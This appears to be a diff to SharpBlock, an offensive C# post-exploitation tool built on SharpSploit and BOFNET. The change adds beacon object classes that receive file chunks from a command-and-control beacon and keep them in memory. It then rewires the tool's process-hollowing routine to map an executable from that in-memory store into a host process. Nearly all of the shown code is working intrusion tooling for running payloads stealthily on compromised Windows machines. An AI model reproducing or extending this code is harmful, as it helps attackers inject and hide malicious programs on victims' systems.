@@ -1,24 +1,84 @@
-﻿using Mono.Options;
+﻿using BOFNET;
+using BOFNET.Bofs;
+using Mono.Options;
+using SharpSploit.Execution;
+using SharpSploit.Execution.Injection;
 using SharpSploit.Execution.ManualMap;
 using System;
 using System.Collections.Generic;
 using System.Collections.ObjectModel;
 using System.Diagnostics;
 using System.IO;
+using System.IO.Pipes;
 using System.Linq;
+using System.Net;
 using System.Runtime.InteropServices;
+using System.Runtime.InteropServices.ComTypes;
 using System.Text;
 using System.Threading;
-using SharpSploit.Execution;
-using static SharpBlock.WinAPI;
-using Execute = SharpSploit.Execution;
+using static BOFNET.Bofs.VFS;
 using static SharpBlock.PE;
-using System.IO.Pipes;
-using SharpSploit.Execution.Injection;
-using System.Net;
-using BOFNET;
+using static SharpBlock.WinAPI;
+using static System.Net.Mime.MediaTypeNames;
+using Execute = SharpSploit.Execution;
 
 namespace SharpBlock {
+    class Files : BeaconObject
+    {
+        public static Dictionary<string, MemoryStream> FileIteams = new Dictionary<string, MemoryStream>();
+        public override void Go(byte[] chunk)
+        {
+            Unpack unpack = new Unpack("Zib", chunk);
+            string text = (string)unpack.Values[0];
+            int num = (int)unpack.Values[1];
+            byte[] array = (byte[])unpack.Values[2];
+            MemoryStream memoryStream;
+            if (!FileIteams.ContainsKey(text))
+            {
+                BeaconConsole.WriteLine("[+] Get Files unique id " + text);
+                memoryStream = new MemoryStream();
+                FileIteams[text] = memoryStream;
+            }
+            else
+            {
+                memoryStream = FileIteams[text];
+            }
+
+            memoryStream.Write(array, 0, array.Length);
+            if (array.Length < num)
+            {
+                BeaconConsole.WriteLine($"[+] Load {text} to SharpBlock Memory");
+            }
+        }
+
+        public Files(BeaconApi api) : base(api)
+        {
+
+        }
+    }
+
+    class FileList : BeaconObject
+    {
+        public override void Go(string[] args)
+        {
+            if (Files.FileIteams.Keys.Count == 0)
+            {
+                BeaconConsole.WriteLine("[*] No files found in memory!");
+                return;
+            }
+            foreach (KeyValuePair<string, MemoryStream> fileItem in Files.FileIteams)
+            {
+                base.BeaconConsole.WriteLine($"{fileItem.Key} {fileItem.Value.Length} bytes");
+            }
+
+            return;
+        }
+
+        public FileList(BeaconApi api) : base(api)
+        {
+
+        }
+    }
 
     class Program : BeaconObject
     {
@@ -45,7 +105,7 @@ namespace SharpBlock {
 
         public Program(BeaconApi api) : base(api)
         {
-
+           
         }
 
         public static void WriteLine(string format, params object[] args)
@@ -661,8 +721,8 @@ namespace SharpBlock {
             //Map our executable into memory from the choosen source (file, web, pipe)
             HostProcessInfo hpi = new HostProcessInfo();
             IntPtr remoteImage;
-            IntPtr entryPoint = MapExecutableMemory(LoadProcessData(path), hProcess, out remoteImage);
-                   
+            //IntPtr entryPoint = MapExecutableMemory(LoadProcessData(path), hProcess, out remoteImage);
+            IntPtr entryPoint = MapExecutableMemory(SharpBlock.Files.FileIteams[path].GetBuffer(), hProcess, out remoteImage);
             //Get the thread context of our newly launched host process
             Context ctx = ContextFactory.Create(ContextFlags.All);
             ctx.GetContext(hThread);
@@ -781,7 +841,7 @@ namespace SharpBlock {
 
         static void Main(string[] args) {
 
-            string program = "c:\\windows\\system32\\runonce.exe";
+            string program = "";
             string hostProcess = null;
             string programArgs = "";
             bool showHelp = false;
